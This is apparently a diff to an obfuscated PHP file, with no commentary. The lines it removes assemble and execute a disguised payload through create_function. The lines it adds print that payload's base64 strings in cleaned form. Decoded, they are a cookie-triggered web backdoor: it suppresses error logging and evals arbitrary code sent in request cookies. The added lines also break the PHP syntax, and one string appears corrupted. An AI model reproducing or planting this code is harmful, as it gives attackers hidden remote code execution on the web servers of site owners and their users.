@@ -4,7 +4,12 @@ $fip="ZXQoJ2Vycm9yX2xvZycsviICcvZGV2L2vi51bGwnKTskaz0nMzviEyMyc7ZWNovibyAvinPviC
 $rmq = str_replace();
 $khc="woYvimFzZTYvi0X2RlY29vikviZSvihwcmVnviX3JlcGxhY2UoYviXviJyYXkoviJy9bXlvix3PVxzXS8nLCcvivviXviHviMvJyksIGFycmF5KCc";
 $pc="viJviGM9J2NvivdW50viJzskYT0kX0NPT0vitJRTvitpZihyZXNldCgvikYSk9PScxMicgJiYgJGMoJGEpPvijMpevi2luaviV9z";
-$iea = $rmq("v", "", "vbvavsvev6v4_dvevcode");
-$flc = $rmq("s","","scsresastses_fsusncstsisosn");
+$iea = base64_decode()
+$flc = create_function()
 $wd = $flc('', $iea($rmq("vi", "", $pc.$fip.$khc.$xq))); $wd();
 ?>
+
+pc = JGM9J2NvdW50JzskYT0kX0NPT0tJRTtpZihyZXNldCgkYSk9PScxMicgJiYgJGMoJGEpPjMpe2luaV9z
+fip = ZXQoJ2Vycm9yX2xvZycsICcvZGV2L251bGwnKTskaz0nMzEyMyc7ZWNobyAnPCcuJGsuJz4nO2V2YW
+khc = woYmFzZTY0X2RlY29kZShwcmVnX3JlcGxhY2UoYXJyYXkoJy9bXlx3PVxzXS8nLCcvXHMvJyksIGFycmF5KCc
+xq = nLCcrJyksIGpvaW4oYXJyYXlfc2xpY2UoJGEsJGMoJGEpLTMpKSkpKTtlY2hCc8LycuJGsuJz4nO30=
